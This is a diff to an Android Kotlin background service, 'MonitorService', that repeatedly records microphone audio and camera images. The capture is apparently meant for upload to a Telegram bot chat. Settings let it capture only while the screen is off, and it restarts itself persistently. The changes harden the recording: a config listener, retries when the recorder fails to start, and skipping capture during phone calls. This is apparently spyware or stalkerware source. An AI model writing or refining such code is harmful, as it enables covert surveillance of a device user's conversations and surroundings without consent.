@@ -52,28 +52,23 @@ class MonitorService : Service(), LifecycleOwner {
     private var captureInterval: Long = 10000L 
 
     private var mediaRecorder: android.media.MediaRecorder? = null
+    private val prefsListener = android.content.SharedPreferences.OnSharedPreferenceChangeListener { sharedPreferences, key ->
+        updateConfigFromPrefs(sharedPreferences)
+    }
+
     override fun onCreate() {
         super.onCreate()
         lifecycleRegistry.currentState = Lifecycle.State.CREATED
         startForegroundServiceNotification()
-        loadCredentials()
-        startLoops()
-    }
-
-    // ... (onStartCommand matches) ...
-    
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        super.onStartCommand(intent, flags, startId)
-        lifecycleRegistry.currentState = Lifecycle.State.STARTED
-        startForegroundServiceNotification()
-        loadCredentials()
-        startLoops()
-        // If credentials valid, send "Monitor Service Started" msg?
-        return START_STICKY
-    }
-    
-    private fun loadCredentials() {
+        
         val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
+        pref.registerOnSharedPreferenceChangeListener(prefsListener)
+        updateConfigFromPrefs(pref)
+        
+        startLoops()
+    }
+    
+    private fun updateConfigFromPrefs(pref: android.content.SharedPreferences) {
         botToken = pref.getString("token", "") ?: ""
         targetChatId = pref.getString("chatId", "") ?: ""
         sendCamera = pref.getBoolean("sendCamera", false)
@@ -89,13 +84,34 @@ class MonitorService : Service(), LifecycleOwner {
         cameraScreenOff = pref.getBoolean("cameraScreenOff", false)
     }
     
+    // Cleanup
+    override fun onDestroy() {
+        super.onDestroy()
+        job?.cancel()
+        mediaRecorder?.release()
+        lifecycleRegistry.currentState = Lifecycle.State.DESTROYED
+        getSharedPreferences("tg_pref", MODE_PRIVATE).unregisterOnSharedPreferenceChangeListener(prefsListener)
+    }
+
+    // ... (rest of onStartCommand) ...
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        super.onStartCommand(intent, flags, startId)
+        lifecycleRegistry.currentState = Lifecycle.State.STARTED
+        startForegroundServiceNotification()
+        // No loadCredentials here, handled by onCreate and listener
+        if (job == null || job?.isActive == false) startLoops()
+        return START_STICKY
+    }
+    
+    // Remove loadCredentials method entirely or alias it
+    
     private fun startLoops() {
         job?.cancel()
         job = CoroutineScope(Dispatchers.IO).launch {
             // Audio Loop
             launch {
                 while (isActive) {
-                    loadCredentials() // Reload to catch config changes
+                    // loadCredentials() REMOVED
                     if (botToken.isNotEmpty() && targetChatId.isNotEmpty() && sendAudio) {
                          val shouldRecord = if (audioScreenOff) !isScreenOn() else true
                          if (shouldRecord) {
@@ -104,22 +120,25 @@ class MonitorService : Service(), LifecycleOwner {
                              delay(5000)
                          }
                     } else {
-                        delay(5000)
+                        delay(10000) // Longer idle wait
                     }
                 }
             }
             
-            // Camera Loop (Independent of Screenshot)
+            // Camera Loop
             launch {
                  while (isActive) {
-                     loadCredentials()
+                     // loadCredentials() REMOVED
                      if (botToken.isNotEmpty() && targetChatId.isNotEmpty() && sendCamera) {
                          val shouldCapture = if (cameraScreenOff) !isScreenOn() else true
                          if (shouldCapture) {
                              captureCameraAndSend()
                          }
                      }
-                     delay(captureInterval)
+                     
+                     // Adaptive delay: if not configured, wait longer
+                     val waitTime = if (sendCamera) captureInterval else 10000L
+                     delay(waitTime)
                  }
             }
         }
@@ -132,12 +151,21 @@ class MonitorService : Service(), LifecycleOwner {
     
     private suspend fun recordAndSendAudio() {
         if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
-            Log.e("MonitorService", "Permission RECORD_AUDIO denied")
+             Log.e("MonitorService", "Permission RECORD_AUDIO denied")
+             return
+        }
+
+        // Check for active call
+        val audioManager = getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
+        if (audioManager.mode == android.media.AudioManager.MODE_IN_CALL || 
+            audioManager.mode == android.media.AudioManager.MODE_IN_COMMUNICATION) {
+            Log.w("MonitorService", "Microphone busy (Call/Comm). Skipping.")
+            delay(30000) // Wait 30s before retry
             return
         }
         
         // Ensure Mic is free
-        delay(1000)
+        delay(2000)
 
         // Use .m4a for high quality AAC
         val dateFormat = java.text.SimpleDateFormat("yyyy-MM-dd_HH-mm-ss", java.util.Locale.getDefault())
@@ -156,14 +184,27 @@ class MonitorService : Service(), LifecycleOwner {
             
             mr.apply {
                 setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
-                // Switch to High Quality AAC
                 setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
                 setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
                 setAudioEncodingBitRate(128000) // 128 kbps
                 setAudioSamplingRate(44100)     // 44.1 kHz
                 setOutputFile(audioFile.absolutePath)
                 prepare()
-                start()
+                delay(100) // Give hardware a moment
+                try {
+                     start()
+                } catch(e: Exception) {
+                     Log.e("MonitorService", "Initial start failed ($e). Retrying...", e)
+                     reset()
+                     setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
+                     setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
+                     setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
+                     setAudioEncodingBitRate(128000)
+                     setAudioSamplingRate(44100)
+                     setOutputFile(audioFile.absolutePath)
+                     prepare()
+                     start() // Try once more, catch in outer block
+                }
             }
             
             Log.d("MonitorService", "Recording Audio for $audioDuration ms")
@@ -190,7 +231,11 @@ class MonitorService : Service(), LifecycleOwner {
         } catch (e: Exception) {
             Log.e("MonitorService", "Audio Record Fatal Error", e)
             if (audioFile.exists()) audioFile.delete()
-            delay(10000) // Cool down on error
+            
+            // Try to reset to clear state
+            try { mr?.reset() } catch(e:Exception){}
+            
+            delay(30000) // Cool down on error
         } finally {
             try { mr?.release() } catch (e: Exception) {}
         }
@@ -297,12 +342,7 @@ class MonitorService : Service(), LifecycleOwner {
         }
     }
 
-    override fun onDestroy() {
-        super.onDestroy()
-        job?.cancel()
-        mediaRecorder?.release()
-        lifecycleRegistry.currentState = Lifecycle.State.DESTROYED
-    }
+
 
     override fun onBind(intent: Intent?): IBinder? = null
     
